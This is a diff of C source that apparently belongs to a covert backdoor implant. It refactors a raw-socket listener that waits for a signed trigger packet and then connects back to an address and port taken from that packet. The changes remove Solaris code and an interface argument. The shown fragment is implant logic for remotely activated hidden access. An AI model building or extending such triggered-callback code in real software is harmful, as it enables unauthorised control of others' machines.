@@ -131,20 +131,6 @@ void* start_triggered_connect( void *param )
 
 	DLX(4, printf("Preparing to exec...\n"));
 
-#if 0	// TODO: Fix this for Solaris
-	/* Solaris SPARC has memory alignment issues, so the bytes of interest need, first,
-		to be copied into a variable that is properly aligned */
-	memcpy( &tb_id, &( recvd_payload->package[4] ), sizeof( uint16_t ) );
-	tb_id = htons( tb_id );
-	D( printf("%s, %4d: Received Port: %d\n", __FILE__, __LINE__, tb_id ); )
-
-#if defined SOLARIS
-	memcpy( &( addrin.S_un ), &( recvd_payload->package[0] ), sizeof( addrin ) );
-#else
-	memcpy( &( addrin.s_addr ), &( recvd_payload->package[0] ), sizeof( addrin ) );
-#endif
-#endif
-
 	// IPv4 addresses only....
 	{
 		char	callback_address[INET_ADDRSTRLEN];
@@ -169,7 +155,7 @@ void* start_triggered_connect( void *param )
 
 //******************************************************************
 
-int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay ) 
+int TriggerListen(int trigger_delay, unsigned long delete_delay)
 {
 	int			socket_fd, packet_length;
 	int 			counter = 0;
@@ -177,17 +163,16 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 
 	Payload 		recvd_payload;
 	TriggerInfo		*tParams;
-#ifdef LINUX
 	struct sockaddr_ll	packet_info;
 	size_t 			packet_info_size = sizeof( packet_info);
-#endif
+
 
 	DL(2);
 	// reap any CHILD processes that die, prevent zombies
 	// this is not needed because no processes are forked
 	signal( SIGCHLD, sigchld_reaper );
   
-	socket_fd = dt_get_socket_fd( iface );
+	socket_fd = dt_get_socket_fd();
 
 	if( socket_fd == FAILURE )
 	{
@@ -204,18 +189,6 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 		}
 
 		memset( packet_buffer, 0, MAX_PKT );
-#if defined SOLARIS
-		// DLX(6, printf( "Listening on solaris raw socket\n"));
-		packet_length = sniff_read_solaris( socket_fd, packet_buffer, MAX_PKT );
-		// DLX(8, printf( "Packet received with length %d bytes\n", packet_length));
-
-		if ( packet_length == FAILURE ) {
-			// not sure what to do upon recv error
-			DLX(5, printf(" ERROR: sniff_read_solaris() returned FAILURE\n"));
-			continue;
-		}
-
-#else
 
 		if ( ( packet_length = recvfrom( socket_fd, packet_buffer, MAX_PKT, 0, 
 				(struct sockaddr *) &packet_info, (socklen_t *) &packet_info_size ) )  == FAILURE )
@@ -224,7 +197,7 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 			DLX(4, printf("Error: recvfrom() failure!\n"));
 			continue;
 		}
-#endif
+
 		else
 		{
 			if ( dt_signature_check( packet_buffer, packet_length, &recvd_payload) == SUCCESS )
